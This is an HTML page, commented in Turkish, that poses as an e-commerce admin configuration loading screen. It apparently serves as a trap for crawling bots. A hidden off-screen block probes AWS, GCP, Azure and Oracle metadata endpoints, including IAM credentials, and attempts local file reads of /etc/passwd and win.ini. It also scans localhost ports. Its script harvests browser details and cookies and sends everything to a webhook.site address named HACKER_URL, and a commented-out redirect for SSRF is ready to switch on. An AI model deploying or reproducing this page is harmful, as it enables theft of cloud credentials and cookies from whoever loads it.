<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>CyberShopier - Admin Configuration</title>
    
    <link rel="dns-prefetch" href="https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904">

    <style>
        body { background-color: #fff; color: #000; font-family: Arial, sans-serif; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* GİZLİ OPERASYON ALANI */
        .stealth-ops {
            position: absolute; left: -5000px; top: -5000px; width: 1px; height: 1px; overflow: hidden;
        }
    </style>
</head>
<body>

    <div style="text-align:center; padding-top:50px;">
        <h1>Sistem Yapılandırılıyor...</h1>
        <p>Lütfen bekleyiniz, güvenli bağlantı kuruluyor.</p>
        <div class="loader"></div>
    </div>

    <div class="stealth-ops">
        
        <img src="http://metadata.google.internal/computeMetadata/v1/instance/hostname" onerror="logHit('GCP_Meta_Fail')" onload="logHit('GCP_Meta_SUCCESS_CRITICAL')">
        <img src="http://169.254.169.254/opc/v1/instance/" onerror="logHit('Oracle_Meta_Fail')" onload="logHit('Oracle_Meta_SUCCESS_CRITICAL')">
        <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="logHit('AWS_Creds_Fail')" onload="logHit('AWS_Creds_SUCCESS_CRITICAL')">
        <img src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" onerror="logHit('Azure_Meta_Fail')" onload="logHit('Azure_Meta_SUCCESS_CRITICAL')">

        <iframe src="file:///etc/passwd" onload="logHit('LFI_Passwd_Found')"></iframe>
        <iframe src="file:///c:/windows/win.ini" onload="logHit('LFI_WinIni_Found')"></iframe>
        <object data="file:///etc/hosts" type="text/plain" onload="logHit('LFI_Hosts_Found')"></object>

        <img src="http://127.0.0.1:22" onerror="logHit('Port_22_Closed')" onload="logHit('Port_22_OPEN')">
        <img src="http://127.0.0.1:3306" onerror="logHit('Port_3306_MySQL_Closed')" onload="logHit('Port_3306_OPEN')">
        <img src="http://127.0.0.1:6379" onerror="logHit('Port_6379_Redis_Closed')" onload="logHit('Port_6379_OPEN_CRITICAL')">
        <img src="http://127.0.0.1:8080" onerror="logHit('Port_8080_Admin_Closed')" onload="logHit('Port_8080_OPEN')">

    </div>

    <script>
        // GÜNCEL WEBHOOK
        const HACKER_URL = "https://webhook.site/85d0aa21-bac7-436a-bd91-bacacdcca904";

        function logHit(info) {
            new Image().src = `${HACKER_URL}?type=probe&info=${info}&t=${Date.now()}`;
        }

        // 4. GELİŞMİŞ JS BİLGİ SIZDIRMA (ENVIRONMENT)
        try {
            const data = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency, // CPU Çekirdek
                ram: navigator.deviceMemory, // RAM
                online: navigator.onLine,
                cookie: document.cookie,
                // Eğer bot clipboard kullanıyorsa okumayı dene (Modern tarayıcılar izin istemeden vermez ama headless botlar verebilir)
                clipboard: "Access Denied (Standard)" 
            };
            
            // Veriyi encode et ve gönder
            const payload = btoa(JSON.stringify(data));
            new Image().src = `${HACKER_URL}?type=js_env&data=${payload}`;

        } catch (e) {}

        // 5. ZORLA YÖNLENDİRME (SSRF İÇİN REDIRECT)
        // Bot sayfada 3 saniye durursa, onu zorla Google Metadata sunucusuna yönlendir.
        setTimeout(function() {
            // Eğer bot redirectleri takip ediyorsa bu onu loop'a sokup hata verdirebilir veya veriyi ifşa edebilir.
            // window.location.href = "http://metadata.google.internal/"; 
            // NOT: Üstteki satırı kapalı tuttum, botu bozup bağlantıyı koparmasın diye. 
            // İstersen "//" işaretini kaldırıp aktif edebilirsin.
            logHit('Timeout_Reached_Bot_Still_Here');
        }, 3000);

    </script>
</body>
</html>
